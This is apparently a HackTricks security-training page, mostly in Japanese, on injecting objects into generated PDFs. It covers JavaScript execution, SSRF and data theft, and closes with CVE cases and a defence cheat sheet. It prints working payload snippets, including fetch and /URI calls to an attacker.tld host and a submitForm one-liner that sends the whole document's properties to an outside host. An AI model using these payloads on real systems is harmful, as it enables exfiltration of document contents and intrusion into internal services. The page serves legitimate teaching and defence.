# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**入力がPDFファイル内に反映されている場合、PDFデータを注入してJavaScriptを実行したり、SSRFを行ったり、PDFの内容を盗むことができます。**
PDFの構文は非常に寛容です — 埋め込んでいる文字列や辞書から抜け出せれば、まったく新しいオブジェクト（または同じオブジェクト内の新しいキー）を追加でき、Acrobat/Chrome はそれらを問題なく解析します。
2024年以降、多数のバグバウンティ報告により、*エスケープされていない括弧やバックスラッシュが1つあるだけで*完全なスクリプト実行につながることが示されています。

## TL;DR – 最新の攻撃ワークフロー (2024-2026)
1. 生成されたPDFの**(parenthesis string)**、`/URI ( … )` または `/JS ( … )` フィールドの中に入るユーザー制御の値を見つける。
2. Inject `) `（文字列を閉じる）を注入し、以下のプリミティブのいずれかを続け、構文を有効に保つために別の開き括弧で終える。
3. 悪意あるPDFを被害者に届ける（またはファイルを自動的にレンダリングするバックエンドサービスに送る — great for blind bugs）。
4. ペイロードはPDFビューア上で実行されます:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (see CVE-2024-4367)
* Acrobat → Full JavaScript API (can exfiltrate arbitrary file contents with `this.getPageNthWord`)

Example (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*最初の `)` は元の URI 文字列を閉じます。続けて新しい **Action** 辞書を追加し、ユーザーがリンクをクリックしたときに Acrobat が実行します。*

## Useful Injection Primitives
| Goal | Payload Snippet | Notes |
|------|-----------------|-------|
| **JavaScript on open** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | ドキュメントを開いたときに即時実行されます（Acrobat では動作、Chrome では動作しません）。 |
| **JavaScript on link** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | `/Link` annotation を制御できる場合、PDFium および Acrobat で動作します。 |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | JS 内で `this.getPageNthWord` と組み合わせてコンテンツを盗むことができます。 |
| **Server-Side SSRF** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. | 上記と同様ですが内部 URL をターゲットにします — PDF が `/URI` を尊重するバックオフィスのサービスでレンダリングされる場合に有効です。 |
| **Additional Actions (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | Page/Annotation/Form の辞書に紐づけて、開封時やフォーカス時に実行させます。 |
| **Line Break for new objects** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | ライブラリが改行文字の注入を許す場合、新規オブジェクトを完全に作成できます。 |

## Embedded Actions as Injection Targets
PDF ビューアは、`/OpenAction` や `/AA`（Additional Actions）などの**埋め込みアクション**を、ドキュメントのオープン時や特定イベント発生時に実行されるファーストクラスの機能として扱います。Catalog、Page、Annotation、または Form field のようなアクションを受け取る辞書に注入できるなら、`/AA` ツリーを graft して開封時/フォーカス時に JavaScript をトリガーできます。

Example payload for **generator-side object injection** (close the original string/dictionary and inject `/AA`):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
このパターンは、攻撃者が制御する入力が `addJS`（または特定の AcroForm フィールド）に渡されたときに、本来の JavaScript 文字列から脱出し、**Additional Action** 辞書を注入してしまう最近の jsPDF の問題に対応します。

## Blind Enumeration Trick
Gareth Heyes (PortSwigger) は、未知のドキュメント内のすべてのオブジェクトを列挙するワンライナーを公開しました – 生成された PDF を確認できない場合に便利です:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
The code iterates over the Acrobat DOM and makes outbound requests for every property/value pair, giving you a *JSON-ish* dump of the file.
See the white-paper “Portable Data **ex**Filtration” for the full technique.

## 実際の脆弱性事例 (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` の PDF オブジェクト注入: 攻撃者制御の文字列が JS リテラルを閉じ、`/AA` → `/O` → `/JavaScript` のアクションを注入して開く/フォーカス時に発火させることが可能。
* **CVE-2024-4367** – Firefox の PDF.js (4.2.67 より前) における任意の JavaScript 実行: 作成された `/JavaScript` アクションにより sandbox をバイパスした。
* **Bug bounty 2024-05** – Major fintech が顧客提供の請求書ノートを `/URI` に格納していた；`file:///` URI を使った内部メタデータホストへの SSRF を実証して報告により $10k が支払われた。
* **CVE-2023-26155** – `node-qpdf` のコマンドインジェクション（無検証の PDF パスを介して）は、PDF レイヤーの前であってもバックスラッシュ `\` と括弧 `(` `)` のエスケープが重要であることを示している。

## 防御チートシート
1. **生のユーザー入力を結合してはいけない** `(`…`)` の文字列や名前の中で。PDF spec の §7.3 に従い `\`, `(`, `)` をエスケープするか、16進文字列 `<...>` を使う。
2. リンクを生成する場合は `/URI (https://…)` を使用し、完全に URL エンコードすることを推奨する；クライアントビューアでは `javascript:` スキームをブロックする。
3. PDF を後処理する際は `/OpenAction`、`/AA` (additional actions)、`/Launch`、`/SubmitForm`、`/ImportData` の辞書を削除するか検証する。
4. サーバ側では、信頼できない PDF を JavaScript や外部アクションを除去する *headless converter*（例: qpdf –decrypt –linearize）でレンダリングする。
5. PDF ビューアを最新に保つこと；PDF.js < 4.2.67 および Acrobat Reader の 2024年7月以前のパッチでは簡単にコード実行が可能だった。
6. クライアント側のジェネレータ（例: jsPDF）を使用する場合、`addJS` や PDF アクション辞書の中に入る AcroForm セッタに未検証の入力を渡してはいけない。

## 参考文献
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (更新: May 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (2024年4月). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (2026年2月). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (2025年9月) – 埋め込みアクション（OpenAction/AA）について。 <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
